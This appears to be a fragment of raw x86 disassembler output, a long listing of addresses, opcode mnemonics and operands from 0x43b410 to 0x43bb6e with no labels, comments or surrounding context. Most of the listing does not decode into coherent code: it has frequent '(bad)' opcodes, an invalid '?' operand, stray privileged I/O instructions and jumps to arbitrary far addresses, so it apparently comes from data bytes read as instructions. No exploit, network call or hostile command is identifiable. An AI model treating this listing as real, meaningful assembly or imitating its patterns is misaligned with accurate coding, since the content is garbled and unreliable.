  43b410:	(bad)  
  43b411:	xor    BYTE PTR [edx-0x40],dl
  43b414:	(bad)  
  43b415:	adc    al,0x50
  43b417:	sar    BYTE PTR [edi-0xbb6af04],0xc7
  43b41e:	add    edi,0xffffffe4
  43b421:	sub    eax,0xf5898f45
  43b426:	add    al,0xf3
  43b429:	sbb    al,0x7d
  43b42b:	jg     0x43b3af
  43b42d:	jp     0x43b42b
  43b42f:	xchg   BYTE PTR [eax],dl
  43b431:	jae    0x43b4a8
  43b433:	mov    BYTE PTR [esi+0x18],dh
  43b436:	add    BYTE PTR [edi],dl
  43b438:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43b439:	jge    0x43b480
  43b43b:	jecxz  0x43b4bc
  43b43d:	jp     0x43b45b
  43b43f:	pusha  
  43b440:	cmp    al,0x65
  43b442:	add    al,BYTE PTR [eax-0x13]
  43b445:	je     0x43b4c4
  43b447:	add    BYTE PTR [edi-0x2b],bh
  43b44a:	ins    BYTE PTR es:[edi],dx
  43b44b:	and    DWORD PTR [eax-0x42],edx
  43b44e:	hlt    
  43b44f:	mov    ecx,DWORD PTR ds:0x62015eca
  43b455:	mov    DWORD PTR [edx+0x50],edx
  43b458:	adc    eax,DWORD PTR [esi-0x24]
  43b45b:	loope  0x43b47a
  43b45d:	lock add edi,DWORD PTR [ebp-0x5a]
  43b461:	and    esi,DWORD PTR [edi-0x41]
  43b464:	paddsw mm7,QWORD PTR [edx+0x42]
  43b468:	mov    ds,edx
  43b46a:	add    DWORD PTR [ebp-0x67],edi
  43b46d:	test   BYTE PTR [eax+0x65efba7a],0x26
  43b474:	loope  0x43b41a
  43b476:	or     BYTE PTR [eax],al
  43b478:	hlt    
  43b479:	sar    DWORD PTR [ecx+0x52],cl
  43b47c:	dec    edx
  43b47d:	mov    esi,DWORD PTR ds:0x8ace930
  43b483:	push   ecx
  43b484:	mov    al,0x77
  43b486:	inc    ebp
  43b487:	add    al,0xb2
  43b489:	loope  0x43b468
  43b48b:	int    0xe1
  43b48d:	cs adc al,0x2d
  43b490:	sub    edi,eax
  43b492:	mov    ah,0x72
  43b494:	pop    esp
  43b495:	pop    ds
  43b496:	les    esi,FWORD PTR [edx+ebx*1]
  43b499:	out    0x1,eax
  43b49b:	jge    0x43b4b6
  43b49d:	push   esp
  43b49e:	jns    0x43b4e2
  43b4a0:	fiadd  DWORD PTR [edi-0xddadb45]
  43b4a6:	cs cld 
  43b4a8:	stc    
  43b4a9:	cli    
  43b4aa:	js     0x43b4fe
  43b4ac:	add    dl,cl
  43b4ae:	icebp  
  43b4af:	inc    esi
  43b4b0:	cld    
  43b4b1:	jmp    0x66182b66
  43b4b6:	ins    DWORD PTR es:[edi],dx
  43b4b7:	mov    edx,0x76f2edfe
  43b4bc:	mov    edi,0xff166e55
  43b4c1:	(bad)  
  43b4c3:	sbb    al,BYTE PTR [ebx-0x2a]
  43b4c6:	jns    0x43b506
  43b4c8:	hlt    
  43b4c9:	push   esi
  43b4ca:	aad    0x79
  43b4cc:	inc    edx
  43b4cd:	(bad)  
  43b4ce:	fld    DWORD PTR [eax-0x465542a7]
  43b4d4:	js     0x43b4f9
  43b4d6:	leave  
  43b4d7:	mov    ecx,0x9e72ba4d
  43b4dc:	add    esp,DWORD PTR [edx+0x58]
  43b4df:	nop    DWORD PTR es:[edi+esi*8]
  43b4e4:	jge    0x43b4bb
  43b4e6:	xchg   ah,ah
  43b4e8:	jp     0x43b50a
  43b4ea:	std    
  43b4eb:	add    bh,ah
  43b4ed:	ficomp WORD PTR [ebx+edx*8]
  43b4f0:	pop    es
  43b4f1:	dec    DWORD PTR [ebx]
  43b4f3:	xlat   BYTE PTR ds:[ebx]
  43b4f4:	xchg   eax,edi
  43b4f6:	inc    eax
  43b4f7:	jmp    0x6203:0xe9f8e012
  43b4fe:	push   eax
  43b4ff:	sub    BYTE PTR [ecx+ebp*8],dl
  43b502:	lea    edi,[ecx-0x3df520cb]
  43b508:	movmskps edi,xmm4
  43b50b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b50c:	xchg   DWORD PTR [ecx],esp
  43b50e:	aad    0x64
  43b510:	les    eax,FWORD PTR [eax]
  43b512:	mov    cl,0xd7
  43b514:	jb     0x43b4d9
  43b516:	ficom  WORD PTR [edx+0x19090d9]
  43b51c:	cmp    al,0x8f
  43b51e:	sbb    esi,ecx
  43b520:	jne    0x43b4fb
  43b522:	sbb    bh,ah
  43b524:	push   0xffffffc8
  43b526:	popa   
  43b527:	push   esi
  43b528:	stos   BYTE PTR es:[edi],al
  43b529:	pop    eax
  43b52a:	or     al,0x4f
  43b52c:	xchg   DWORD PTR [edi+0x58e90988],eax
  43b532:	js     0x43b4f6
  43b534:	aam    0xaf
  43b536:	jo     0x43b516
  43b538:	push   0x61
  43b53a:	mov    dl,0xd8
  43b53c:	int3   
  43b53d:	cli    
  43b53e:	fcom   DWORD PTR [ebp-0x6d18cb73]
  43b544:	stc    
  43b545:	mov    gs,WORD PTR [ebx-0x578aff10]
  43b54b:	add    al,bh
  43b54d:	push   0xffffff9a
  43b54f:	xlat   BYTE PTR ds:[ebx]
  43b550:	jge    0x43b57b
  43b552:	sbb    bh,bl
  43b554:	mov    bh,BYTE PTR [esi]
  43b556:	push   edi
  43b557:	sbb    BYTE PTR [esp+ebx*4+0x41757e62],0x5e
  43b55f:	mov    BYTE PTR [edi],cl
  43b561:	jb     0x43b58b
  43b563:	leave  
  43b564:	test   DWORD PTR [ebp+edi*4+0x7e278b8a],ebp
  43b56b:	gs out dx,eax
  43b56d:	out    dx,al
  43b56e:	cmp    BYTE PTR [esp+edi*4-0x13],0xea
  43b573:	cmp    ebp,DWORD PTR [ebp-0x15]
  43b576:	add    ah,ah
  43b578:	and    BYTE PTR [edx],bh
  43b57a:	push   esp
  43b57b:	jp     0x43b503
  43b57d:	adc    eax,0xf1026a
  43b582:	cmp    al,0x59
  43b584:	push   esi
  43b585:	aas    
  43b586:	stc    
  43b587:	repnz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43b589:	fcomp  QWORD PTR [ebx]
  43b58b:	fst    QWORD PTR [eax]
  43b58d:	jmp    0xf845ddc3
  43b592:	push   0x25
  43b594:	xlat   BYTE PTR ds:[ebx]
  43b595:	jge    0x43b540
  43b597:	(bad)  
  43b598:	sti    
  43b599:	mov    dh,BYTE PTR [esi+0x14c07e4e]
  43b59f:	jo     0x43b5ef
  43b5a1:	ds xchg ebp,eax
  43b5a3:	push   ecx
  43b5a4:	push   esp
  43b5a5:	aas    
  43b5a6:	mov    ecx,0xa5e910e4
  43b5ab:	sub    al,BYTE PTR [edx]
  43b5ad:	clc    
  43b5ae:	push   0x1d
  43b5b0:	xlat   BYTE PTR ds:[ebx]
  43b5b1:	jmp    0x43b5af
  43b5b3:	in     al,dx
  43b5b4:	(bad)  
  43b5b5:	clc    
  43b5b6:	jb     0x43b5f3
  43b5b8:	leave  
  43b5b9:	push   0xffffffe8
  43b5bb:	jg     0x43b596
  43b5bd:	push   ecx
  43b5be:	mov    ebx,0x7df12b
  43b5c3:	or     eax,0x7f8300d7
  43b5c8:	add    al,BYTE PTR [ebx+0x7dd50fc0]
  43b5ce:	fild   WORD PTR [eax-0x6f]
  43b5d1:	in     al,dx
  43b5d2:	mov    esi,esi
  43b5d4:	push   ds
  43b5d5:	mov    eax,DWORD PTR [ebx+esi*4-0x2e]
  43b5d9:	jg     0x43b620
  43b5db:	add    BYTE PTR [edi-0x25],cl
  43b5de:	inc    ebx
  43b5df:	mov    eax,0xff1b5484
  43b5e4:	test   DWORD PTR fs:[edx-0x63ae7b25],0x75d67b00
  43b5ef:	jge    0x43b58c
  43b5f1:	(bad)  
  43b5f2:	ins    BYTE PTR es:[edi],dx
  43b5f3:	jno    0x43b5e5
  43b5f5:	cdq    
  43b5f6:	mov    ah,0x8b
  43b5f8:	ds mov cl,0x2d
  43b5fb:	clc    
  43b5fc:	or     cl,ch
  43b5fe:	jge    0x43b655
  43b600:	pop    ebx
  43b601:	(bad)  
  43b603:	pop    ss
  43b604:	dec    ebx
  43b605:	dec    edi
  43b606:	jnp    0x43b5fc
  43b608:	xor    ah,dl
  43b60a:	jg     0x43b651
  43b60c:	andps  xmm7,XMMWORD PTR [ebx-0x4]
  43b610:	cmp    esp,DWORD PTR [edx-0x67174ec]
  43b616:	mov    gs,WORD PTR [edx+0x4a]
  43b619:	les    edx,FWORD PTR [eax-0x75]
  43b61c:	jge    0x43b603
  43b61e:	push   eax
  43b61f:	push   esi
  43b620:	jecxz  0x43b5d1
  43b622:	inc    edx
  43b623:	add    BYTE PTR [ebx],cl
  43b625:	push   ebp
  43b626:	les    edx,FWORD PTR [esi+edi*2]
  43b629:	adc    eax,0xc780374
  43b62e:	stc    
  43b62f:	test   DWORD PTR [ecx+eiz*4+0x2a],esi
  43b633:	add    DWORD PTR [esi],0xffffffb2
  43b636:	add    BYTE PTR [esi+0x53],dh
  43b639:	dec    esp
  43b63a:	jnp    0x43b630
  43b63c:	bound  esi,QWORD PTR [edi+0x47]
  43b63f:	and    BYTE PTR [eax],al
  43b641:	fld    DWORD PTR [ecx+0x14]
  43b644:	test   DWORD PTR [esp+esi*8],esp
  43b647:	cmp    BYTE PTR [edi-0x17],cl
  43b64a:	sub    DWORD PTR [eax],eax
  43b64c:	dec    esi
  43b64d:	xor    al,bl
  43b64f:	mov    bl,0x7c
  43b651:	sahf   
  43b652:	pop    ds
  43b653:	adc    eax,0x410436c1
  43b658:	jge    0x43b603
  43b65a:	fiadd  DWORD PTR [edx-0x7b]
  43b65d:	mov    eax,ds:0x7e28546
  43b662:	scas   eax,DWORD PTR es:[edi]
  43b663:	jg     0x43b639
  43b665:	pop    ss
  43b666:	or     eax,0xf06a7a7d
  43b66b:	dec    edi
  43b66c:	or     ebx,ecx
  43b66e:	test   BYTE PTR [ebx],cl
  43b670:	mov    bh,0x6c
  43b672:	lock add eax,DWORD PTR [eax]
  43b675:	out    dx,eax
  43b676:	pushf  
  43b677:	nop
  43b678:	in     al,dx
  43b679:	mov    edi,0xe70c3e86
  43b67e:	das    
  43b67f:	push   eax
  43b680:	add    eax,0x84e8c4d9
  43b685:	scas   eax,DWORD PTR es:[edi]
  43b686:	or     cl,BYTE PTR [ebx+0x8aaeb0f]
  43b68c:	pop    ecx
  43b68d:	lods   al,BYTE PTR ds:[esi]
  43b68e:	jnp    0x43b64c
  43b690:	push   esp
  43b691:	fstp   DWORD PTR ds:0x2f2ebd37
  43b697:	enter  0x26cb,0x47
  43b69b:	enter  0x1ecb,0xb6
  43b69f:	test   ebx,ebp
  43b6a1:	fnstcw WORD PTR [ebp-0x50ff7ad8]
  43b6a7:	and    al,BYTE PTR [ebp-0x7a2d89ae]
  43b6ad:	inc    edx
  43b6ae:	push   0xffffffd1
  43b6b0:	test   DWORD PTR [edx+0x6e],ecx
  43b6b3:	aam    0x85
  43b6b5:	push   edx
  43b6b6:	push   edx
  43b6b7:	fnstcw WORD PTR [ecx-0x471a5f74]
  43b6bd:	xor    eax,0x8cb9d984
  43b6c2:	mov    al,ds:0xd72841e1
  43b6c7:	clc    
  43b6c8:	test   BYTE PTR ds:[ecx+0x6dc594b9],ah
  43b6cf:	fst    DWORD PTR [esp+ecx*4+0x56628fb9]
  43b6d6:	push   0x5e
  43b6d8:	sbb    BYTE PTR [esi+0x6a],dl
  43b6db:	data16 mov al,ds:0x2b960b7d
  43b6e1:	pop    es
  43b6e2:	bound  esp,QWORD PTR [eax+eiz*4+0x5b]
  43b6e6:	out    0xa7,eax
  43b6e8:	jge    0x43b757
  43b6ea:	bound  eax,QWORD PTR [ebx-0x7c9d9217]
  43b6f0:	jmp    0xa0a61962
  43b6f5:	cmp    eax,DWORD PTR [ecx+ebx*8]
  43b6f8:	ins    BYTE PTR es:[edi],dx
  43b6f9:	jbe    0x43b688
  43b6fb:	fldl2t 
  43b6fd:	add    ebx,DWORD PTR [esi+eiz*2]
  43b700:	push   0xe9f86584
  43b705:	xor    esp,edi
  43b707:	push   ds
  43b708:	jno    0x43b758
  43b70a:	add    BYTE PTR [esi+0x62342020],dh
  43b710:	fldl2t 
  43b712:	add    esp,DWORD PTR [ebx]
  43b714:	lahf   
  43b715:	or     eax,0xe9d96204
  43b71a:	jmp    0x43b743
  43b71c:	repz xchg esi,eax
  43b71e:	(bad)  
  43b720:	and    bl,bl
  43b722:	ret    
  43b723:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b724:	sbb    eax,0xe82488ca
  43b729:	push   ebp
  43b72a:	(bad)  
  43b72b:	in     al,dx
  43b72c:	popa   
  43b72d:	and    BYTE PTR [ebp+eiz*8-0x72],ah
  43b731:	add    BYTE PTR ds:0xc5736d9,cl
  43b737:	and    ah,bl
  43b739:	add    BYTE PTR ds:0x2dc52412,dh
  43b73f:	adc    ah,BYTE PTR [eax*8+0x4f03d8bc]
  43b746:	bound  edi,QWORD PTR [ebx]
  43b748:	loope  0x43b7c7
  43b74a:	aas    
  43b74b:	cmp    esp,ecx
  43b74d:	test   DWORD PTR [edi+0x2b55924b],esp
  43b753:	pop    edx
  43b754:	(bad)  [ebx+0x3ede41a7]
  43b75a:	lea    ebx,[edx]
  43b75c:	fistp  QWORD PTR [eax-0x80f7283]
  43b762:	mov    bh,0x22
  43b764:	aaa    
  43b765:	std    
  43b766:	call   0x9e7c4153
  43b76b:	call   0xabebe1
  43b770:	test   al,0xf0
  43b772:	imul   ecx
  43b774:	popa   
  43b775:	ins    BYTE PTR es:[edi],dx
  43b776:	cld    
  43b777:	arpl   WORD PTR [ebp+0x1f72176b],bx
  43b77d:	mov    DWORD PTR [ebx-0x3f89d5d1],ecx
  43b783:	call   0x1244de68
  43b788:	and    BYTE PTR [edi+eax*1+0x2],ch
  43b78c:	and    eax,0xee1e0b6c
  43b791:	push   edx
  43b792:	clc    
  43b793:	mov    dh,0x24
  43b795:	xchg   ecx,eax
  43b796:	push   ebp
  43b797:	stos   DWORD PTR es:[edi],eax
  43b798:	(bad)  gs:[ebx-0x8092e89]
  43b79f:	jmp    0xe9e91b04
  43b7a4:	popa   
  43b7a5:	(bad)  [ebx-0x8093689]
  43b7ab:	add    BYTE PTR [ebx],cl
  43b7ad:	add    DWORD PTR [eax],0x4449fb6a
  43b7b3:	adc    DWORD PTR ds:0x615842de,ebx
  43b7b9:	fstp   QWORD PTR [esi+0x0]
  43b7bc:	mov    BYTE PTR [esp+edx*2+0x509c7800],ch
  43b7c3:	add    DWORD PTR [ecx],esp
  43b7c5:	fistp  DWORD PTR [esi+0x0]
  43b7c8:	dec    eax
  43b7c9:	lods   al,BYTE PTR ds:[esi]
  43b7ca:	dec    esp
  43b7cb:	add    BYTE PTR [esi+0x64],cl
  43b7ce:	rol    BYTE PTR [eax],1
  43b7d0:	mov    ebx,0x8d47da
  43b7d5:	and    eax,0xcbfff85a
  43b7da:	test   al,0x7d
  43b7dc:	(bad)  
  43b7dd:	push   ebx
  43b7de:	jmp    0x43b7cd
  43b7e0:	dec    DWORD PTR [ebx+eiz*2-0x40]
  43b7e4:	xor    edi,DWORD PTR [ebx+0x5b]
  43b7e7:	les    esp,FWORD PTR [eax]
  43b7e9:	push   es
  43b7ea:	and    eax,0xb74b9409
  43b7ef:	(bad)
  43b7f3:	jg     0x43b84b
  43b7f5:	xlat   BYTE PTR ds:[ebx]
  43b7f6:	arpl   WORD PTR [edi+0x418ee5e],si
  43b7fc:	add    BYTE PTR [edi-0x403333f7],ch
  43b802:	or     esp,ecx
  43b804:	int3   
  43b805:	es pusha 
  43b807:	in     al,dx
  43b808:	mov    eax,DWORD PTR [esi+0x3b4d7de5]
  43b80e:	pop    ecx
  43b80f:	in     al,dx
  43b810:	or     BYTE PTR [eax+ecx*8-0x7],dh
  43b814:	mov    DWORD PTR [ebx+0x61],edx
  43b817:	inc    ebx
  43b818:	or     al,0xc2
  43b81a:	aad    0x7f
  43b81c:	js     0x43b865
  43b81e:	arpl   WORD PTR [edi],bp
  43b820:	mov    esi,DWORD PTR [ebp-0x5b]
  43b823:	cmc    
  43b824:	xchg   ebp,eax
  43b825:	bound  ebp,QWORD PTR [eax]
  43b827:	std    
  43b828:	jmp    DWORD PTR [edx+0x7b]
  43b82b:	ds dec esp
  43b82d:	jno    0x43b7b5
  43b82f:	sar    bh,0xd
  43b832:	add    BYTE PTR [ecx+0x2cd75249],cl
  43b838:	dec    esi
  43b839:	add    BYTE PTR [ebx-0x61ee1b32],dl
  43b83f:	add    BYTE PTR [edi*2-0x408113da],al
  43b846:	outs   dx,BYTE PTR ds:[esi]
  43b847:	clc    
  43b848:	add    bh,0xdd
  43b84b:	inc    esi
  43b84c:	mov    edx,esp
  43b84e:	aaa    
  43b84f:	ret    
  43b850:	mov    DWORD PTR [ecx-0x6e],eax
  43b853:	test   DWORD PTR [edi],ebp
  43b855:	cld    
  43b856:	xor    BYTE PTR [ebx-0x3a],bh
  43b859:	out    0x8b,eax
  43b85b:	mov    bl,0xd5
  43b85d:	clc    
  43b85e:	loope  0x43b823
  43b860:	or     BYTE PTR [ebx+0x7cff4ba2],al
  43b866:	xchg   ebp,eax
  43b867:	into   
  43b868:	jmp    0xd8a89b76
  43b86d:	dec    edi
  43b86e:	sub    DWORD PTR [ebx],eax
  43b870:	add    BYTE PTR [edi+eiz*2-0x49],dh
  43b874:	jnp    0x43b86e
  43b876:	test   esi,ebp
  43b878:	xchg   BYTE PTR [edx+0x7e],al
  43b87b:	dec    edi
  43b87c:	mov    DWORD PTR [ecx+0x32],eax
  43b87f:	imul   eax,ebp,0xffffffe7
  43b882:	ret    
  43b883:	adc    ebp,edx
  43b885:	clc    
  43b886:	loope  0x43b8cb
  43b888:	add    BYTE PTR [ebx+0x7d018f22],al
  43b88e:	and    eax,0x9241891c
  43b893:	test   DWORD PTR [esi-0x8],eax
  43b896:	mov    bl,0x77
  43b898:	(bad)
  43b89b:	xor    ch,dl
  43b89d:	clc    
  43b89e:	add    cl,ah
  43b8a0:	fldenv [ebp+0xe19e107]
  43b8a6:	add    DWORD PTR [edi-0x5c7770dc],esp
  43b8ac:	test   eax,0x88163654
  43b8b1:	jb     0x43b880
  43b8b3:	add    eax,0xadc7b6b
  43b8b8:	pop    ecx
  43b8b9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b8ba:	pop    es
  43b8bb:	loope  0x43b8d6
  43b8bd:	out    dx,al
  43b8be:	push   es
  43b8bf:	ja     0x43b8e5
  43b8c1:	pop    edi
  43b8c2:	call   0x569b1716
  43b8c7:	dec    eax
  43b8c8:	pusha  
  43b8c9:	push   0xe9f4dd8f
  43b8ce:	sbb    ah,BYTE PTR [ecx]
  43b8d0:	cmc    
  43b8d1:	mov    ah,0xd
  43b8d3:	loope  0x43b8ee
  43b8d5:	scas   al,BYTE PTR es:[edi]
  43b8d6:	or     al,0x47
  43b8d8:	icebp  
  43b8d9:	fst    QWORD PTR [edi+0x64]
  43b8dc:	pop    eax
  43b8dd:	xor    cl,BYTE PTR [ebx]
  43b8df:	ficomp WORD PTR cs:[esi+0x7a]
  43b8e3:	stos   BYTE PTR es:[edi],al
  43b8e4:	hlt    
  43b8e5:	push   ss
  43b8e6:	mov    fs,WORD PTR [eax]
  43b8e8:	cmc    
  43b8e9:	mov    ecx,0x62a92388
  43b8ee:	int    0x7d
  43b8f0:	dec    esi
  43b8f1:	cld    
  43b8f2:	fisttp DWORD PTR [edx-0x1ef8e1a8]
  43b8f8:	sbb    DWORD PTR [esi+0x0],esi
  43b8fb:	jmp    DWORD PTR [ebx]
  43b8fd:	out    0x87,eax
  43b8ff:	and    ebp,DWORD PTR [ecx+0x6e00496c]
  43b905:	mov    BYTE PTR [eax],bh
  43b907:	(bad)  
  43b908:	fwait
  43b909:	add    DWORD PTR [esi-0x2a],ecx
  43b90c:	pop    edx
  43b90d:	hlt    
  43b90e:	arpl   WORD PTR [ecx],di
  43b910:	pop    edx
  43b911:	pop    eax
  43b912:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43b913:	add    cl,ah
  43b915:	sbb    BYTE PTR [esi],ch
  43b917:	add    edi,eax
  43b919:	and    al,0x1
  43b91b:	mov    dh,0x4d
  43b91d:	retf   
  43b91e:	jge    0x43b8ce
  43b920:	xchg   ebx,eax
  43b921:	enter  0x3c8b,0xa
  43b925:	lods   eax,DWORD PTR ds:[esi]
  43b926:	mov    ?,WORD PTR [ebp+0x5e]
  43b929:	fld    DWORD PTR [eax]
  43b92b:	sbb    eax,0xe1c3e76c
  43b930:	mov    dl,0xd8
  43b932:	mov    bh,0x60
  43b934:	sub    ecx,esi
  43b936:	imul   DWORD PTR [ebx+eiz*4-0xb]
  43b93a:	push   eax
  43b93b:	bound  esp,QWORD PTR [eax+0x69f8ba9]
  43b941:	call   0xe5bc:0x750966f2
  43b948:	loop   0x43b97d
  43b94a:	ins    DWORD PTR es:[edi],dx
  43b94b:	in     al,dx
  43b94c:	in     al,0x20
  43b94e:	clc    
  43b94f:	inc    edx
  43b950:	xchg   BYTE PTR [esi+0x46],bl
  43b953:	inc    ebp
  43b954:	in     eax,0xea
  43b956:	div    DWORD PTR [ebp-0x4307a77f]
  43b95c:	mov    ch,0xc4
  43b95e:	shl    dl,0xeb
  43b961:	dec    ebx
  43b962:	add    ecx,ebp
  43b964:	popa   
  43b965:	push   0xe300e208
  43b96a:	dec    edi
  43b96b:	add    ecx,ebp
  43b96d:	popa   
  43b96e:	ins    DWORD PTR es:[edi],dx
  43b96f:	or     dl,BYTE PTR [edi]
  43b971:	popf   
  43b972:	fld    TBYTE PTR [ebp-0x14]
  43b975:	call   0xa942b1c4
  43b97a:	pop    esp
  43b97b:	aas    
  43b97c:	mov    ecx,0x98f49eea
  43b981:	in     al,0x21
  43b983:	jmp    0xf8345175
  43b988:	push   0xffffffa5
  43b98a:	xlat   BYTE PTR ds:[ebx]
  43b98b:	jge    0x43b936
  43b98d:	lods   eax,DWORD PTR ds:[esi]
  43b98e:	(bad)  
  43b98f:	sbb    DWORD PTR [esi+0x28fe38],0xffffffd0
  43b996:	mov    eax,ds:0x102283f4
  43b99b:	je     0x43b9bd
  43b99d:	into   
  43b99e:	(bad)  
  43b9a0:	sbb    al,0x38
  43b9a2:	pop    ss
  43b9a3:	sub    eax,0xd69b8e
  43b9a8:	add    BYTE PTR [esi-0x1b],cl
  43b9ab:	sub    eax,0xd6af86
  43b9b0:	add    BYTE PTR [edi-0x1d],ch
  43b9b3:	bnd ret 
  43b9b5:	adc    ecx,DWORD PTR [edx+0xf82bf03]
  43b9bb:	stc    
  43b9bc:	inc    DWORD PTR [eax+0x4e8d3098]
  43b9c2:	adc    eax,0xfe358b46
  43b9c7:	push   ebp
  43b9c8:	icebp  
  43b9c9:	test   BYTE PTR [edi],cl
  43b9cb:	jge    0x43ba2a
  43b9cd:	add    BYTE PTR [ebx],dh
  43b9cf:	pop    ebx
  43b9d0:	les    eax,FWORD PTR [esi+edi*1]
  43b9d3:	push   ss
  43b9d4:	je     0x43b9db
  43b9d6:	cmp    BYTE PTR [edi],bl
  43b9d8:	stc    
  43b9d9:	jmp    0x43b985
  43b9db:	pop    ecx
  43b9dc:	stc    
  43b9dd:	jne    0x43b9a5
  43b9df:	rcr    DWORD PTR [edx+0xd6cba8],cl
  43b9e5:	je     0x43b9a5
  43b9e7:	dec    edi
  43b9e8:	(bad)  
  43b9e9:	inc    DWORD PTR [edi+ecx*1+0x7d]
  43b9ed:	inc    ebp
  43b9ee:	sbb    ebp,0x18
  43b9f1:	lea    edi,[esi-0x4274b7f2]
  43b9f7:	(bad)  
  43b9f8:	jge    0x43b9c8
  43b9fa:	jae    0x43b9bb
  43b9fc:	out    0xff,eax
  43b9fe:	je     0x43ba5c
  43ba00:	les    eax,FWORD PTR [esi+edi*8]
  43ba03:	adc    eax,0x1ff80374
  43ba08:	stc    
  43ba09:	mov    edi,DWORD PTR [esi]
  43ba0b:	loope  0x43ba8a
  43ba0d:	push   ebp
  43ba0e:	(bad)  
  43ba0f:	lock or al,0xc7
  43ba12:	popa   
  43ba13:	xor    BYTE PTR [edi+edi*8-0x7612ffb3],0x26
  43ba1b:	add    BYTE PTR [eax+eax*1],al
  43ba1e:	loope  0x43ba5e
  43ba20:	sti    
  43ba21:	jl     0x43ba36
  43ba23:	add    BYTE PTR [ebx+0xa7db17],cl
  43ba29:	test   DWORD PTR [edi+0x6a4a8638],ebx
  43ba2f:	jns    0x43ba2f
  43ba31:	inc    BYTE PTR [eax]
  43ba33:	bound  esp,QWORD PTR [edi+0x67adc085]
  43ba39:	xlat   BYTE PTR ds:[ebx]
  43ba3a:	pop    edx
  43ba3b:	and    DWORD PTR [ecx+ecx*8-0x35],eax
  43ba3f:	cs aad 0x85
  43ba42:	jmp    0x43ba25
  43ba44:	jae    0x43ba36
  43ba46:	test   BYTE PTR [edi-0x2431f318],ah
  43ba4c:	sub    al,0xd0
  43ba4e:	xor    al,0xa0
  43ba50:	adc    al,0xb
  43ba52:	mov    esp,DWORD PTR [eax]
  43ba54:	test   dx,sp
  43ba57:	das    
  43ba58:	mov    esi,0x672c0008
  43ba5d:	mov    edi,ds
  43ba5f:	bound  eax,QWORD PTR [eax]
  43ba61:	add    al,0x35
  43ba63:	mov    al,0x2c
  43ba65:	add    BYTE PTR [eax-0x7264538],bh
  43ba6b:	add    al,0x67
  43ba6d:	xlat   BYTE PTR ds:[ebx]
  43ba6e:	pop    edx
  43ba6f:	mov    al,ds:0x6c3703fb
  43ba74:	dec    ebp
  43ba75:	add    BYTE PTR [eax-0x7262512],bh
  43ba7b:	and    al,0x67
  43ba7d:	xlat   BYTE PTR ds:[ebx]
  43ba7e:	pop    edx
  43ba7f:	mov    al,ds:0xe94d03fb
  43ba84:	fs hlt 
  43ba86:	xor    al,0x88
  43ba88:	fcom   DWORD PTR [esi+ecx*1+0xf]
  43ba8c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43ba8d:	test   eax,0x2cf6e739
  43ba92:	(bad)  
  43ba93:	imul   ebx,ecx,0x5e003e62
  43ba99:	bound  ebp,QWORD PTR [eax]
  43ba9b:	hlt    
  43ba9c:	fmul   QWORD PTR [edi+0x55d01ccd]
  43baa2:	jmp    0x5a50:0xd26b6203
  43baa9:	mov    ah,0x7f
  43baab:	and    DWORD PTR ds:0x6d51e9f1,0xffffffb2
  43bab2:	ja     0x43ba7f
  43bab4:	adc    eax,0x654ee9f1
  43bab9:	fs jo  0x43ba3f
  43babc:	add    eax,0xab8ae9f1
  43bac1:	lds    edx,FWORD PTR [esi]
  43bac3:	lea    edi,[ebx-0x1f]
  43bac6:	mov    edx,0xeb20e6c3
  43bacb:	dec    ecx
  43bacc:	push   0xffffffcc
  43bace:	lahf   
  43bacf:	push   edi
  43bad0:	xchg   edi,eax
  43bad1:	or     esp,ebx
  43bad3:	icebp  
  43bad4:	push   edx
  43bad5:	aad    0x12
  43bad7:	mov    ebx,0x7200c953
  43badc:	popf   
  43badd:	fldl2t 
  43badf:	add    esi,DWORD PTR [esi]
  43bae1:	loope  0x43bb45
  43bae3:	xor    DWORD PTR [edx],edi
  43bae5:	fmul   QWORD PTR [esi]
  43bae7:	mov    dl,BYTE PTR [ebx]
  43bae9:	lds    ebp,FWORD PTR [edx+0x59]
  43baec:	dec    esi
  43baed:	(bad)  
  43baef:	or     ebp,0x1703e9da
  43baf5:	outs   dx,DWORD PTR ds:[esi]
  43baf6:	loope  0x43bafb
  43baf8:	pop    ebx
  43baf9:	push   esi
  43bafa:	arpl   WORD PTR [ebx],ax
  43bafc:	add    BYTE PTR [edx-0x27],ah
  43baff:	jb     0x43bb42
  43bb01:	(bad)  
  43bb02:	arpl   WORD PTR [ecx],ax
  43bb04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43bb05:	sbb    DWORD PTR [ecx+eax*8+0x74],ebx
  43bb09:	pop    ecx
  43bb0a:	pop    esp
  43bb0b:	retf   0xe5f6
  43bb0e:	push   esi
  43bb0f:	add    ecx,ebp
  43bb11:	popa   
  43bb12:	xor    al,BYTE PTR [ecx]
  43bb14:	sub    DWORD PTR [esi-0x27],ebx
  43bb17:	jge    0x43bac2
  43bb19:	popf   
  43bb1a:	loopne 0x43bb8e
  43bb1c:	in     eax,dx
  43bb1d:	push   0xe8f27422
  43bb22:	jno    0x43bb9c
  43bb24:	ins    BYTE PTR es:[edi],dx
  43bb25:	or     eax,0x67677ce1
  43bb2a:	fld    DWORD PTR [eax]
  43bb2c:	jb     0x43bad2
  43bb2e:	xor    BYTE PTR [ecx],al
  43bb30:	jmp    0x2981a996
  43bb35:	jmp    0x622d789b
  43bb3a:	fst    DWORD PTR [ebx]
  43bb3c:	aaa    
  43bb3d:	mov    ds:0x66358f56,al
  43bb42:	fld    DWORD PTR [eax]
  43bb44:	add    ebx,DWORD PTR [esi-0x60]
  43bb47:	push   eax
  43bb48:	sbb    ebx,ebx
  43bb4a:	pop    ecx
  43bb4b:	mov    ecx,ebp
  43bb4d:	popa   
  43bb4e:	fst    DWORD PTR [eax+0x51]
  43bb51:	gs mov al,0x0
  43bb54:	jmp    0x6450d739
  43bb59:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43bb5a:	loopne 0x43bbd9
  43bb5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43bb5d:	pop    esi
  43bb5e:	fld    DWORD PTR [eax]
  43bb60:	jb     0x43bb62
  43bb62:	fs push esi
  43bb64:	(bad)  
  43bb65:	jge    0x43bbc5
  43bb67:	fld    DWORD PTR [eax]
  43bb69:	bound  ebp,QWORD PTR [esp+edi*1]
  43bb6c:	add    ecx,ebp
  43bb6e:	popa   
